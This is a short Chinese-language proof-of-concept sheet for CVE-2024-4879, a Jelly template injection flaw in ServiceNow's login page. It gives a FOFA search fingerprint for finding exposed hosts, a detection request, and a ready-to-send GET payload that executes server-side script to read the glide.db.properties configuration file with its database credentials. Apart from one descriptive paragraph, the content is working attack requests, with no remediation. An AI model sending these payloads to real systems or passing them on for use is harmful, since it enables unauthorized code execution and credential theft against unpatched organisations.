**fofa**

```
icon_hash="1701804003"
```

**一、漏洞简述**

ServiceNow UI (用户界面)是ServiceNow平台提供的一种直观、现代化的用户交互方式。它采用响应式设计,能在各种设备上显示良好,并提供直观的导航菜单和面包屑功能,让用户能快速找到所需的功能和信息。同时,ServiceNow UI 支持个性化设置,用户可以自定义UI的外观和布局。针对移动设备,ServiceNow UI也进行了优化,提供了触摸优先的交互方式。总的来说, ServiceNow UI旨在为用户提供一种简单、统一且高效的使用体验,满足他们在ServiceNow平台上的各种需求。其存在CVE-2024-4879 Jelly模板注入漏洞攻击者可通过此漏洞执行代码，读取系统文件内容。

**二、漏洞检测poc**

```
GET /login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Egs.addErrorMessage(9999*9999);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close


```

读取配置文件

```yaml
GET /login.do?jvar_page_title=%3Cstyle%3E%3Cj:jelly%20xmlns:j=%22jelly:core%22%20xmlns:g=%27glide%27%3E%3Cg:evaluate%3Ez=new%20Packages.java.io.File(%22%22).getAbsolutePath();z=z.substring(0,z.lastIndexOf(%22/%22));u=new%20SecurelyAccess(z.concat(%22/co..nf/glide.db.properties%22)).getBufferedReader();s=%22%22;while((q=u.readLine())!==null)s=s.concat(q,%22%5Cn%22);gs.addErrorMessage(s);%3C/g:evaluate%3E%3C/j:jelly%3E%3C/style%3E%22 HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close

```

